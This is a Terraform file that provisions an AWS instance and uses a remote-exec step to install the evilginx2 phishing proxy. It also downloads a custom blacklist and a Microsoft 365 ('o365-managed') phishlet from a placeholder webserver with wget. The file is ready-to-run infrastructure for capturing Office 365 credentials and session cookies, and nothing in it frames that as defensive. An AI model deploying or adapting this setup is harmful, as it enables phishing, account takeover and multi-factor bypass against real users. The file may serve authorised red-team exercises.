resource "aws_instance" "gen" {
  ami = var.ami
  # count                  = 3
  instance_type          = var.instance_type
  key_name               = var.key_name
  vpc_security_group_ids = var.security_group_id
  root_block_device {
    volume_size = "32"
  }

  tags = {
    Name = "${var.name}"
  }

  connection {
    type        = "ssh"
    user        = "admin"
    private_key = file("./keys/<public-key>")
    host        = self.private_ip
  }

  provisioner "remote-exec" {
    inline = [
      "sleep 30",
      "sudo apt update",
      ## install evilginx
      "cd /opt",
      "sudo apt install golang git make -y",
      "sudo git clone https://github.com/kgretzky/evilginx2.git",
      "cd /opt/evilginx2/",
      "sudo make",
      "sudo make install",
      ## modify evilginx
      "sudo wget 'http://<webserver>/evilginx-blacklist.txt' -O '/root/.evilginx/blacklist.txt'",
      "sudo wget 'http://<webserver>/o365-managed.yaml' -O '/usr/share/evilginx/phishlets/o365-managed.yaml'"
      ]
  }
}
